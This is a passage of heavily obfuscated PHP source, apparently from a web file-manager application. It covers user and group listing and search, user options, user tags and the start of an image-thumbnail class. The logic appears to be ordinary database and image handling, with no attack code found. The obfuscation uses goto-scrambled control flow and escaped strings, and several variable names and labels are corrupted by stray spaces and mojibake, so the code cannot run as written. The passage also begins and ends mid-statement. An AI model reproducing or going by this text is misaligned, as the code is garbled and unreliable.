$_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $cÉ”ŠÆïÁÛ = $this->getInfoSimple($dÍ¯í‡ç˜£); if (!$cÉ”ŠÆïÁÛ || empty($B Á†²ÎÅô)) { return !1; } $b¼ëã§¢Å = array(); foreach ($B Á†²ÎÅô as $b¨‘—œÏ—Ñ => $dÃ‹•Õ°¹) { $b¼ëã§¢Å[] = array($CõÁ´‰†§[1437] => $dÍ¯í‡ç˜£, $CõÁ´‰†§[2108] => $b¨‘—œÏ—Ñ, $CõÁ´‰†§[2252] => $dÃ‹•Õ°¹, $CõÁ´‰†§[2130] => 0); } return Model($CõÁ´‰†§[2187])->addAll($b¼ëã§¢Å, array(), !0); } protected function userGroupRemove($d¦ê¹…ùä˜, $F Ã¶„”‚‘) { $b˜«º×™Á„ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $B¤±‡åÍÃ® = $this->getInfoSimple($d¦ê¹…ùä˜); if (!$B¤±‡åÍÃ® || !$F Ã¶„”‚‘) { return !1; } $C“œˆÇâà¼ = array($b˜«º×™Á„[1428] => $d¦ê¹…ùä˜, $b˜«º×™Á„[2185] => $F Ã¶„”‚‘); return Model($b˜«º×™Á„[2187])->where($C“œˆÇâà¼)->delete(); } public function listData() { $Bì‰·¶æ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($Bì‰·¶æ[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][354]]); return $Bì‰·¶æ; } public function listByID($b‡¹˜óóí•) { $Eà«Í¨Ã™¼ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$b‡¹˜óóí•) { return; } $F˜ ßÅ˜… = array($Eà«Í¨Ã™¼[1437] => array($Eà«Í¨Ã™¼[7], $b‡¹˜óóí•)); $E•¬†ÅÙæÂ = $this->where($F˜ ßÅ˜…)->select(); $this->_listDataApply($E•¬†ÅÙæÂ); return $E•¬†ÅÙæÂ; } public function listByGroup($cŞ³¹­õ’® = 0, $E°ÖÇÃóÄ™ = array()) { goto bÇŠÒ³²ä; eÂ“éíŸœ: $this->_listDataApply($F‰÷ƒ“ç¨©[$b¤¸›¡¹ºì[354]]); return $F‰÷ƒ“ç¨©; goto F™ÔÖáØ—; bÇŠÒ³²ä: $b¤¸›¡¹ºì =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $c”ãŞ‰áÊ« = $b¤¸›¡¹ºì[33]; $FŸŞ¸Ë…¦ = array(); goto b·†â°ĞäÇ; b·†â°ĞäÇ: if ($cŞ³¹­õ’®) { $FŸŞ¸Ë…¦ = array($b¤¸›¡¹ºì[2559] => intval($cŞ³¹­õ’®)); $c”ãŞ‰áÊ« = "\x4c\x45\x46\x54\x20\x4a\x4f\111\x4e\40{$this->tablePrefix}\x75\x73\145\162\137\x67\x72\157\165\160\x20\x75\x73\145\x72\137\x67\x72\x6f\x75\x70\x20\157\156\40\x75\163\x65\162\56\x75\x73\x65\x72\x49\x44\x20\75\40\165\x73\x65\162\x5f\147\x72\157\x75\x70\56\165\x73\145\x72\x49\x44"; $DŠÌ£Áš¼ = Input::get($b¤¸›¡¹ºì[407], null, $b¤¸›¡¹ºì[33]) ? $b¤¸›¡¹ºì[33] : $b¤¸›¡¹ºì[2560]; } if (isset($E°ÖÇÃóÄ™[$b¤¸›¡¹ºì[683]])) { $FŸŞ¸Ë…¦[$b¤¸›¡¹ºì[2561]] = $E°ÖÇÃóÄ™[$b¤¸›¡¹ºì[683]]; } $F‰÷ƒ“ç¨© = $this->_makeOrder($DŠÌ£Áš¼)->field($b¤¸›¡¹ºì[2562])->where($FŸŞ¸Ë…¦)->join($c”ãŞ‰áÊ«)->selectPage(50); goto eÂ“éíŸœ; F™ÔÖáØ—: } private function _makeOrder($a«ªí˜Ò„â = '') { goto e‰°äÑİ¼½; e‰°äÑİ¼½: $Féäëö†Ü• =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $DËàìù©¾• = array($Féäëö†Ü•[1437], $Féäëö†Ü•[28], $Féäëö†Ü•[2094], $Féäëö†Ü•[2066], $Féäëö†Ü•[187]); $cØ“Š—ğÅ = array($Féäëö†Ü•[402] => $Féäëö†Ü•[403], $Féäëö†Ü•[404] => $Féäëö†Ü•[405]); goto Eª¬¤š¨¤; fáğÙ §÷ƒ: $a«ªí˜Ò„â = $a«ªí˜Ò„â . "\x75\x73\145\162\x2e{$aØ¤çÕÄ©}\x20{$EØÏ î„¥°}\x2c\40\x75\x73\x65\162\56\x75\163\x65\162\111\x44\40\x61\x73\143"; return $this->alias($Féäëö†Ü•[2307])->order($a«ªí˜Ò„â); goto dœ£¹¢Ÿ“; Eª¬¤š¨¤: $aØ¤çÕÄ© = Input::get($Féäëö†Ü•[407], $Féäëö†Ü•[7], $Féäëö†Ü•[1428], $DËàìù©¾•); $EØÏ î„¥° = Input::get($Féäëö†Ü•[408], $Féäëö†Ü•[7], $Féäëö†Ü•[2188], array($Féäëö†Ü•[2188], $Féäëö†Ü•[404])); $EØÏ î„¥° = $cØ“Š—ğÅ[$EØÏ î„¥°]; goto fáğÙ §÷ƒ; dœ£¹¢Ÿ“: } public function listSearch($FèÜæóÒËØ) { goto C£´ï’ÛÙ; EÉ‡á¤¢¯: if (!$EùµÁ‚íË || count($EùµÁ‚íË[$e¥š©­ËÅ[354]]) < 5 && Input::check($føÅïİˆğÔ, $e¥š©­ËÅ[306])) { $EªÜğ°¬ = $this->_searchFromMeta($e¥š©­ËÅ[415], $føÅïİˆğÔ, 10); $aøğ–¿ÎÚÌ = $this->_searchFromMeta($e¥š©­ËÅ[416], $føÅïİˆğÔ, 10); $AÄãÇ ‘ìÅ = array_merge($EªÜğ°¬, $aøğ–¿ÎÚÌ, $EùµÁ‚íË[$e¥š©­ËÅ[354]]); $EùµÁ‚íË[$e¥š©­ËÅ[354]] = array_unique_by_key($AÄãÇ ‘ìÅ, $e¥š©­ËÅ[1437]); $EùµÁ‚íË[$e¥š©­ËÅ[351]][$e¥š©­ËÅ[352]] = count($EùµÁ‚íË[$e¥š©­ËÅ[354]]); $EùµÁ‚íË[$e¥š©­ËÅ[351]][$e¥š©­ËÅ[353]] = ceil($EùµÁ‚íË[$e¥š©­ËÅ[351]][$e¥š©­ËÅ[352]] / $EùµÁ‚íË[$e¥š©­ËÅ[351]][$e¥š©­ËÅ[349]]); } $this->_listDataApply($EùµÁ‚íË[$e¥š©­ËÅ[354]]); $this->_filterByGroup($EùµÁ‚íË, $dêÊøø®); goto EÊçå©áÔ²; e¨‚ ôÙÓÜ: if (!$føÅïİˆğÔ) { $b©´Ê˜’œ— = array(); } if (isset($FèÜæóÒËØ[$e¥š©­ËÅ[683]])) { $b©´Ê˜’œ—[$e¥š©­ËÅ[683]] = $FèÜæóÒËØ[$e¥š©­ËÅ[683]]; } $EùµÁ‚íË = $this->_makeOrder()->where($b©´Ê˜’œ—)->selectPage(20); goto EÉ‡á¤¢¯; Cçƒùí™¤: $føÅïİˆğÔ = str_replace($e¥š©­ËÅ[2191], $e¥š©­ËÅ[2192], trim($føÅïİˆğÔ)); $b©´Ê˜’œ— = array($e¥š©­ËÅ[28] => array($e¥š©­ËÅ[753], "\45{$føÅïİˆğÔ}\x25"), $e¥š©­ËÅ[293] => array($e¥š©­ËÅ[753], "\45{$føÅïİˆğÔ}\x25"), $e¥š©­ËÅ[2366] => array($e¥š©­ËÅ[753], "\45{$føÅïİˆğÔ}\x25"), $e¥š©­ËÅ[910] => $e¥š©­ËÅ[2193]); if (Input::check($føÅïİˆğÔ, $e¥š©­ËÅ[299])) { $b©´Ê˜’œ—[$e¥š©­ËÅ[1437]] = array($e¥š©­ËÅ[753], "\45{$føÅïİˆğÔ}\x25"); $b©´Ê˜’œ—[$e¥š©­ËÅ[2543]] = array($e¥š©­ËÅ[753], "\45{$føÅïİˆğÔ}\45"); } goto e¨‚ ôÙÓÜ; EÊçå©áÔ²: return $EùµÁ‚íË; goto d†¾Ğ‰Ê‚; C£´ï’ÛÙ: $e¥š©­ËÅ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $føÅïİˆğÔ = $FèÜæóÒËØ[$e¥š©­ËÅ[2189]]; $dêÊøø® = isset($FèÜæóÒËØ[$e¥š©­ËÅ[2190]]) ? $FèÜæóÒËØ[$e¥š©­ËÅ[2190]] : !1; goto Cçƒùí™¤; d†¾Ğ‰Ê‚: } private function _filterByGroup(&$fª¤à›¾†, $A™¹Ì¼¯¿Ñ) { $A¹Œåôõí¡ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$A™¹Ì¼¯¿Ñ) { return $fª¤à›¾†; } foreach ($fª¤à›¾†[$A¹Œåôõí¡[354]] as $CŠ®«ÎêÈâ => &$d«ê†ñ†») { $CéÓ´ØÏÒ¸ = array_to_keyvalue($d«ê†ñ†»[$A¹Œåôõí¡[2277]], $A¹Œåôõí¡[33], $A¹Œåôõí¡[2108]); if (!in_array($A™¹Ì¼¯¿Ñ, $CéÓ´ØÏÒ¸)) { unset($fª¤à›¾†[$A¹Œåôõí¡[354]][$CŠ®«ÎêÈâ]); } } unset($d«ê†ñ†»); $fª¤à›¾†[$A¹Œåôõí¡[354]] = array_values($fª¤à›¾†[$A¹Œåôõí¡[354]]); $fª¤à›¾†[$A¹Œåôõí¡[351]] = array($A¹Œåôõí¡[2341] => count($fª¤à›¾†[$A¹Œåôõí¡[354]]), $A¹Œåôõí¡[2339] => $fª¤à›¾†[$A¹Œåôõí¡[351]][$A¹Œåôõí¡[349]], $A¹Œåôõí¡[2338] => 1, $A¹Œåôõí¡[2340] => 1); } private function _searchFromMeta($AÇç…À‹™, $b…±Æƒ“ŞÄ, $aäŒ“øÚ) { goto F™ÕäÀÁ²‚; F™ÕäÀÁ²‚: $bæµ£†Äá =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $b…±Æƒ“ŞÄ = strtolower($b…±Æƒ“ŞÄ); $D¾ÒÊ£Àã¤ = array($bæµ£†Äá[89] => $AÇç…À‹™, $bæµ£†Äá[359] => array($bæµ£†Äá[753], "\x25{$b…±Æƒ“ŞÄ}\45")); goto EÛçÄ½Ìë; F©Òœ‚Æ£î: $DŞ¤ŠĞ§Ô© = $this->where(array($bæµ£†Äá[1428] => array($bæµ£†Äá[7], $d×·ÒĞ©‡É)))->select(); if (!$DŞ¤ŠĞ§Ô©) { return array(); } return $DŞ¤ŠĞ§Ô©; goto A‘Ãáğ«™; EÛçÄ½Ìë: $d×·ÒĞ©‡É = Model($bæµ£†Äá[2563])->where($D¾ÒÊ£Àã¤)->limit($aäŒ“øÚ)->select(); if (!$d×·ÒĞ©‡É) { return array(); } $d×·ÒĞ©‡É = array_to_keyvalue($d×·ÒĞ©‡É, $bæµ£†Äá[33], $bæµ£†Äá[1437]); goto F©Òœ‚Æ£î; A‘Ãáğ«™: } private function _listDataApplyItem($dìˆ˜æßÃê) { $F§ÔëªŠ’ = array($dìˆ˜æßÃê); $this->_listDataApply($F§ÔëªŠ’); return $F§ÔëªŠ’[0]; } private function _listDataApply(&$fÍ®øä•ğ) { goto bï¼ÓÑÁÅÙ; FóŒïê½æ: $this->_listAppendSourceRoot($fÍ®øä•ğ, $F¸Ñôßî‚); goto e‡ñé£ÎÆÄ; bï¼ÓÑÁÅÙ: $E‰„ÏË±Ô =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$fÍ®øä•ğ) { return; } array_remove_key($fÍ®øä•ğ, $E‰„ÏË±Ô[798]); goto FÛ¶Çù“œ; FÛ¶Çù“œ: $F¸Ñôßî‚ = array_to_keyvalue($fÍ®øä•ğ, $E‰„ÏË±Ô[33], $E‰„ÏË±Ô[1437]); $this->_listAppendGroup($fÍ®øä•ğ, $F¸Ñôßî‚); $this->_listAppendMeta($fÍ®øä•ğ, $F¸Ñôßî‚); goto FóŒïê½æ; e‡ñé£ÎÆÄ: } private function _listAppendSourceRoot(&$cµÀÑšĞÁŠ, $cº—ÊÛÅÊŒ) { goto Cå”à“Ù¨„; Cå”à“Ù¨„: $Fáö½Æ¤èà =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $AÎ¿¤ŠØßà = array($Fáö½Æ¤èà[463] => 0, $Fáö½Æ¤èà[371] => SourceModel::TYPE_USER, $Fáö½Æ¤èà[458] => array($Fáö½Æ¤èà[7], $cº—ÊÛÅÊŒ)); $aˆâ“Ø¤ = $Fáö½Æ¤èà[2200]; goto C‡»·¿ò£; dÏœÂğÀİ½: foreach ($cµÀÑšĞÁŠ as &$dàÎÊ¦˜¦) { $dàÎÊ¦˜¦[$Fáö½Æ¤èà[391]] = $dµØ·±‘šÍ[$dàÎÊ¦˜¦[$Fáö½Æ¤èà[1437]]] ? $dµØ·±‘šÍ[$dàÎÊ¦˜¦[$Fáö½Æ¤èà[1437]]] : array(); } unset($dàÎÊ¦˜¦); goto a‹ÇšÆ±; C‡»·¿ò£: $dµØ·±‘šÍ = Model($Fáö½Æ¤èà[754])->order($Fáö½Æ¤èà[2201])->field($aˆâ“Ø¤)->where($AÎ¿¤ŠØßà)->select(); $dµØ·±‘šÍ = array_to_keyvalue($dµØ·±‘šÍ, $Fáö½Æ¤èà[458]); $dµØ·±‘šÍ = array_remove_key($dµØ·±‘šÍ, $Fáö½Æ¤èà[458]); goto dÏœÂğÀİ½; a‹ÇšÆ±: } private function _listAppendGroup(&$B…º…Àï, $b¯î‹ÎÚ‹Æ) { goto c·ñ†—È; c·ñ†—È: $eĞ‰ÔŒŠ– =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $CõËŠßÚ“¨ = array($eĞ‰ÔŒŠ–[1437] => array($eĞ‰ÔŒŠ–[7], $b¯î‹ÎÚ‹Æ)); $fáª£ Šß = Model($eĞ‰ÔŒŠ–[2187])->where($CõËŠßÚ“¨)->select(); goto EÒÑ’ˆÍÛ©; BèøøŸ»µ : $CõËŠßÚ“¨ = array($eĞ‰ÔŒŠ–[2108] => array($eĞ‰ÔŒŠ–[7], $aåå­‹‡´)); $a‡´²­ÃÔâ = Model($eĞ‰ÔŒŠ–[2275])->field($eĞ‰ÔŒŠ–[2564])->where($CõËŠßÚ“¨)->select(); $a‡´²­ÃÔâ = array_to_keyvalue($a‡´²­ÃÔâ, $eĞ‰ÔŒŠ–[2108]); goto A†¤Ï‘Í®•; eœğ‹Æé: foreach ($B…º…Àï as &$c©ò¥Á¸ğå) { $c©ò¥Á¸ğå[$eĞ‰ÔŒŠ–[2277]] = array(); if (isset($fáª£ Šß[$c©ò¥Á¸ğå[$eĞ‰ÔŒŠ–[1437]]])) { $c©ò¥Á¸ğå[$eĞ‰ÔŒŠ–[2277]] = $fáª£ Šß[$c©ò¥Á¸ğå[$eĞ‰ÔŒŠ–[1437]]]; } } unset($c©ò¥Á¸ğå); goto bÈİÀÉÒö‘; EÒÑ’ˆÍÛ©: $aåå­‹‡´ = array_to_keyvalue($fáª£ Šß, $eĞ‰ÔŒŠ–[33], $eĞ‰ÔŒŠ–[2108]); $aåå­‹‡´ = array_remove_value(array_unique($aåå­‹‡´), $eĞ‰ÔŒŠ–[470]); if (!$aåå­‹‡´ || !$fáª£ Šß) { return; } goto BèøøŸ»µ ; A†¤Ï‘Í®•: $fáª£ Šß = array_to_keyvalue_group($fáª£ Šß, $eĞ‰ÔŒŠ–[1437]); foreach ($fáª£ Šß as &$BÛŞÌÓ¨ó) { $Fß÷ÎËÛèŞ = array(); foreach ($BÛŞÌÓ¨ó as $bÌÖÙÀ“‹Ş) { if (!$bÌÖÙÀ“‹Ş[$eĞ‰ÔŒŠ–[2252]]) { continue; } $dñ™Ø‰¤Á½ = Model($eĞ‰ÔŒŠ–[2271])->listData($bÌÖÙÀ“‹Ş[$eĞ‰ÔŒŠ–[2252]]); $Fß÷ÎËÛèŞ[] = array($eĞ‰ÔŒŠ–[2108] => $bÌÖÙÀ“‹Ş[$eĞ‰ÔŒŠ–[2108]], $eĞ‰ÔŒŠ–[2565] => $a‡´²­ÃÔâ[$bÌÖÙÀ“‹Ş[$eĞ‰ÔŒŠ–[2108]]][$eĞ‰ÔŒŠ–[28]], $eĞ‰ÔŒŠ–[461] => $a‡´²­ÃÔâ[$bÌÖÙÀ“‹Ş[$eĞ‰ÔŒŠ–[2108]]][$eĞ‰ÔŒŠ–[461]], $eĞ‰ÔŒŠ–[376] => $dñ™Ø‰¤Á½); } $BÛŞÌÓ¨ó = $Fß÷ÎËÛèŞ; } unset($BÛŞÌÓ¨ó); goto eœğ‹Æé; bÈİÀÉÒö‘: } private function _listAppendMeta(&$e‹¶ÒÉ­ŸÒ, $c«õÁŒ®‰) { goto F˜¼´ŠÒÉš; dá…Ôœ: foreach ($e‹¶ÒÉ­ŸÒ as &$eÂ‰¶´‘‹ä) { $bËÊÓÁïçÉ = array(); if (isset($D±—‚šâÁŞ[$eÂ‰¶´‘‹ä[$fŒá§•¡÷[1437]]])) { $bËÊÓÁïçÉ = $D±—‚šâÁŞ[$eÂ‰¶´‘‹ä[$fŒá§•¡÷[1437]]]; } $eÂ‰¶´‘‹ä[$fŒá§•¡÷[2567]] = array(); if (isset($bËÊÓÁïçÉ[$aéÀíÄ˜—])) { $eÂ‰¶´‘‹ä[$fŒá§•¡÷[2567]] = $cõœğÒø–->getUserJobInfo($bËÊÓÁïçÉ[$aéÀíÄ˜—]); } } unset($eÂ‰¶´‘‹ä); goto e¦¿èâáŠ‘; F˜¼´ŠÒÉš: $fŒá§•¡÷ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $aéÀíÄ˜— = UserJobModel::JOB_KEY; $DÍÆê§ ‰ù = array($fŒá§•¡÷[2545]); goto CøÕšßË; D›´óÄ§Ò‡: foreach ($D±—‚šâÁŞ as &$A­ßÏ»Şæß) { $e°‚¦‚Ññ‘ = array(); foreach ($A­ßÏ»Şæß as $A’ª‘Ç‡…º) { if (!in_array($A’ª‘Ç‡…º[$fŒá§•¡÷[89]], $DÍÆê§ ‰ù)) { $e°‚¦‚Ññ‘[$A’ª‘Ç‡…º[$fŒá§•¡÷[89]]] = $A’ª‘Ç‡…º[$fŒá§•¡÷[359]]; } } $A­ßÏ»Şæß = $e°‚¦‚Ññ‘; } unset($A­ßÏ»Şæß); $cõœğÒø– = Model($fŒá§•¡÷[2566]); goto dá…Ôœ; CøÕšßË: $eöì˜‡‡…˜ = array($fŒá§•¡÷[1437] => array($fŒá§•¡÷[7], $c«õÁŒ®‰)); $D±—‚šâÁŞ = Model($fŒá§•¡÷[2542])->where($eöì˜‡‡…˜)->select(); $D±—‚šâÁŞ = array_to_keyvalue_group($D±—‚šâÁŞ, $fŒá§•¡÷[1437]); goto D›´óÄ§Ò‡; e¦¿èâáŠ‘: } protected function groupUserAll($CÁŠ›÷Ã®°) { $aÉ£½‹ğÑ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$CÁŠ›÷Ã®°) { return !1; } $aÂ¸ãº­´ = Model($aÉ£½‹ğÑ[2187])->field($aÉ£½‹ğÑ[1437])->where(array($aÉ£½‹ğÑ[2108] => array($aÉ£½‹ğÑ[7], $CÁŠ›÷Ã®°)))->select(); $aÂ¸ãº­´ = array_to_keyvalue($aÂ¸ãº­´, $aÉ£½‹ğÑ[33], $aÉ£½‹ğÑ[1437]); return array_unique($aÂ¸ãº­´); } public function userSearch($b£Ú¶ä‰ÅÄ, $DªÑîÏôÒ = "\52") { return Model($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][479])->where($b£Ú¶ä‰ÅÄ)->field($DªÑîÏôÒ)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\x73\x65\162\x5f\157\160\164\151\157\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($dÍƒ«ÏçĞ) { $fòÒ‰­ğÄ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!defined($fòÒ‰­ğÄ[427])) { define($fòÒ‰­ğÄ[427], 0); } return "\125\x73\145\162\x4f\160\164\x69\x6f\156\x5f{$dÍƒ«ÏçĞ}\x5f" . USER_ID; } protected function filterWhere($Cƒ„£‘¿–›) { $fƒÏàÏğ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!defined($fƒÏàÏğ[427])) { define($fƒÏàÏğ[427], 0); } $Cƒ„£‘¿–›[$fƒÏàÏğ[1437]] = USER_ID; return $Cƒ„£‘¿–›; } public function cacheRemoveUser($AËòÒˆæº†, $Dİ½ÄËÒçã) { return Cache::remove("\125\x73\145\162\x4f\160\x74\x69\x6f\156\x5f{$AËòÒˆæº†}\x5f" . $Dİ½ÄËÒçã); } protected function optionDefault($dÑÒÍ×ÚŠ÷ = '') { $F…´¸ÁˆÊè =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if ($dÑÒÍ×ÚŠ÷ == $F…´¸ÁˆÊè[33]) { return $GLOBALS[$F…´¸ÁˆÊè[6]][$F…´¸ÁˆÊè[2568]]; } if ($dÑÒÍ×ÚŠ÷ == $F…´¸ÁˆÊè[2569]) { return $GLOBALS[$F…´¸ÁˆÊè[6]][$F…´¸ÁˆÊè[2570]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\x73\x65\x72\56\x74\x61\x67\114\x69\x73\164"; public $modelType = "\125\x73\x65\162\117\160\164\x69\x6f\156"; public $field = array("\156\141\155\x65", "\x73\x74\171\154\145", "\x73\157\x72\164"); public function listData($D¯šÄŸÜ¼Ñ = false, $BâÑ˜Í£ØÂ = "\163\157\162\x74", $d£«‹Úİæ³ = false) { return parent::listData($D¯šÄŸÜ¼Ñ, $BâÑ˜Í£ØÂ, $d£«‹Úİæ³); } public function remove($Bí…ÛöÛ) { return parent::remove($Bí…ÛöÛ); } public function add($FÇìëÚÊí, $cóÌ­…ÀÂœ = "\x6c\141\142\x65\x6c\55\x67\162\x65\x79\55\x6e\157\162\x6d\141\154") { $CÀƒ¹óè•ë =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if ($this->findByName($FÇìëÚÊí)) { return !1; } $fôĞÚù«‰Õ = array($CÀƒ¹óè•ë[386] => $FÇìëÚÊí, $CÀƒ¹óè•ë[437] => $cóÌ­…ÀÂœ, $CÀƒ¹óè•ë[2112] => $this->getSort($CÀƒ¹óè•ë[246]) + 1); return parent::insert($fôĞÚù«‰Õ); } public function update($DÖ¡®‰ºÇë, $c‹ù•…™†) { $b­¥›Ö ‡Ê =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $E˜öÙÀîÇó = $this->listData($DÖ¡®‰ºÇë); $dÑ–Š×ğá‰ = $this->findByName($c‹ù•…™†[$b­¥›Ö ‡Ê[28]]); if (!$E˜öÙÀîÇó || $dÑ–Š×ğá‰ && $dÑ–Š×ğá‰[$b­¥›Ö ‡Ê[367]] != $E˜öÙÀîÇó[$b­¥›Ö ‡Ê[367]]) { return !1; } return parent::update($DÖ¡®‰ºÇë, $c‹ù•…™†); } public function moveTop($aø’‡İŞˆ) { $eÒÃµ¯²é¢ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $A¦†‡ÏÏ = parent::listData(); $E­ò¿–»†Æ = $this->getSort($eÒÃµ¯²é¢[245]); foreach ($A¦†‡ÏÏ as &$DñŒËÈ™) { if ($DñŒËÈ™[$eÒÃµ¯²é¢[367]] == $aø’‡İŞˆ) { $DñŒËÈ™[$eÒÃµ¯²é¢[2130]] = $E­ò¿–»†Æ; continue; } $DñŒËÈ™[$eÒÃµ¯²é¢[2130]] += 1; } unset($DñŒËÈ™); return parent::resetData($A¦†‡ÏÏ); } public function moveBottom($e•±¬¨‘œ) { $EœÆÄ‹¯§¿ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $dÉÄ×âÒãê = $this->getSort($EœÆÄ‹¯§¿[246]) + 1; return parent::update($e•±¬¨‘œ, array($EœÆÄ‹¯§¿[2130] => $dÉÄ×âÒãê)); } public function resetSort($EñÏ†å»ŠÓ) { goto dÔŒËÔà ˜; dÔŒËÔà ˜: $B‚¸Õ™ëô =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $dÙŠéÄìßô = array(); $EñÏ†å»ŠÓ = is_array($EñÏ†å»ŠÓ) ? $EñÏ†å»ŠÓ : array(); goto CÜš¦¬ôİƒ; d§ïÕĞ³£: unset($DÛÜ—Æù–½); return parent::resetData($Dª§•ÔŠ÷¯); goto Ešïóä¤»İ; CÜš¦¬ôİƒ: for ($EÉ®Á‰æ† = 0; $EÉ®Á‰æ† < count($EñÏ†å»ŠÓ); $EÉ®Á‰æ†++) { $dÙŠéÄìßô[$EñÏ†å»ŠÓ[$EÉ®Á‰æ†] . $B‚¸Õ™ëô[33]] = $EÉ®Á‰æ† + 1; } $Dª§•ÔŠ÷¯ = parent::listData(); foreach ($Dª§•ÔŠ÷¯ as &$DÛÜ—Æù–½) { $B¬¼‹·”®Ê = $dÙŠéÄìßô[$DÛÜ—Æù–½[$B‚¸Õ™ëô[367]]]; $DÛÜ—Æù–½[$B‚¸Õ™ëô[2130]] = $B¬¼‹·”®Ê ? $B¬¼‹·”®Ê : $DÛÜ—Æù–½[$B‚¸Õ™ëô[2130]]; } goto d§ïÕĞ³£; Ešïóä¤»İ: } private function getSort($B÷¿ÕÌ„˜ó) { $E¤ğ›ôÀ¬ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $aõ©éêèàÙ = parent::listData(); $EÄ¾Òç×®– = array_to_keyvalue($aõ©éêèàÙ, $E¤ğ›ôÀ¬[33], $E¤ğ›ôÀ¬[2130]); if (!$EÄ¾Òç×®–) { $EÄ¾Òç×®– = array(0); } $D¾ŒàŞÏ”Œ = $B÷¿ÕÌ„˜ó == $E¤ğ›ôÀ¬[246] ? max($EÄ¾Òç×®–) : min($EÄ¾Òç×®–); return intval($D¾ŒàŞÏ”Œ); } } goto c«î•‚Òä; BÅ½éŞãˆæ: function beforeShutdown() { Hook::trigger($_SERVER[¡Áã][32]); } $_SERVER[$_SERVER[¡Áã][33]] = BASIC_PATH; $_SERVER[$_SERVER[¡Áã][34]] = LIB_DIR; goto fò‚Ã‹í¡; Däù»çÕÃæ: class ImageThumb { var $srcFile = ''; var $imgData = ''; var $echoType; var $im = ''; var $srcW = ''; var $srcH = ''; function __construct($AŠÖ¸—Íƒ…, $C˜ÁíÙÉš¶) { goto C‡¢˜Ú¦©Î; C‡¢˜Ú¦©Î: $this->srcFile = $AŠÖ¸—Íƒ…; $this->echoType = $C˜ÁíÙÉš¶; $this->im = self::image($AŠÖ¸—Íƒ…); goto Fó×¿¿œ™í; AÛÅ‡ì£ß“: $this->srcW = imageSX($this->im); $this->srcH = imageSY($this->im); return $this; goto C†š˜ğìñ; Fó×¿¿œ™í: if (!$this->im) { return !1; } $døÕÆ”ï‰ = $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][33]; $this->imgData = GetImageSize($AŠÖ¸—Íƒ…, $døÕÆ”ï‰); goto AÛÅ‡ì£ß“; C†š˜ğìñ: } public static function image($eëæ¨¤Ğ‹¾) { $BæÉÑÏÂ¶“ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $Dä°‹›ëâä = $BæÉÑÏÂ¶“[33]; $aÏ²ƒ°¶±í = GetImageSize($eëæ¨¤Ğ‹¾, $Dä°‹›ëâä); $AÄ£™Š‹¤ = !1; switch ($aÏ²ƒ°¶±í[2]) { case IMAGETYPE_GIF: if (!function_exists($BæÉÑÏÂ¶“[1865])) { break; } $AÄ£™Š‹¤ = imagecreatefromgif($eëæ¨¤Ğ‹¾); break; case IMAGETYPE_JPEG: if (!function_exists($BæÉÑÏÂ¶“[1866])) { break; } $AÄ£™Š‹¤ = imagecreatefromjpeg($eëæ¨¤Ğ‹¾); break; case IMAGETYPE_PNG: if (!function_exists($BæÉÑÏÂ¶“[1867])) { break; } $AÄ£™Š‹¤ = @imagecreatefrompng($eëæ¨¤Ğ‹¾); imagesavealpha($AÄ£™Š‹¤, !0); break; case IMAGETYPE_XBM: $AÄ£™Š‹¤ = imagecreatefromxbm($eëæ¨¤Ğ‹¾); break; case IMAGETYPE_WBMP: $AÄ£™Š‹¤ = imagecreatefromwbmp($eëæ¨¤Ğ‹¾); break; case IMAGETYPE_BMP: $AÄ£™Š‹¤ = imagecreatefrombmp($eëæ¨¤Ğ‹¾); break; default: break; } return $AÄ£™Š‹¤; } public static function imageSize($FÂª©ÖË§) { $c‚‹êï¬« =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $b®È®—á = GetImageSize($FÂª©ÖË§); if (!$b®È®—á) { return !1; } return array($c‚‹êï¬«[1868] => $b®È®—á[0], $c‚‹êï¬«[1869] => $b®È®—á[1]); } function distortion($F„šÍñåÈÔ, $c¥Ÿ¯Šµ‡­, $Bƒò¾õÚ) { $Eîó¥ŸæÒ = $this->creatImage($this->im, $c¥Ÿ¯Šµ‡­, $Bƒò¾õÚ, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($Eîó¥ŸæÒ, $F„šÍñåÈÔ); } function prorate($e×ÚÃ¶éß°, $aÚï°„…, $DôÓ„ÎÍÚ) { $aÑ‰ÂÃ¯“Ÿ = $aÚï°„… / $DôÓ„ÎÍÚ; $EÔƒ¨çïÉª = $this->srcW / $this->srcH; if ($aÑ‰ÂÃ¯“Ÿ <= $EÔƒ¨çïÉª) { $b‰ŞÒñ–˜ = $aÚï°„…; $e°Å·ç‘óé = $b‰ŞÒñ–˜ * ($this->srcH / $this->srcW); } else { $e°Å·ç‘óé = $DôÓ„ÎÍÚ; $b‰ŞÒñ–˜ = $e°Å·ç‘óé * ($this->srcW / $this->srcH); } if ($this->srcW > $aÚï°„… || $this->srcH > 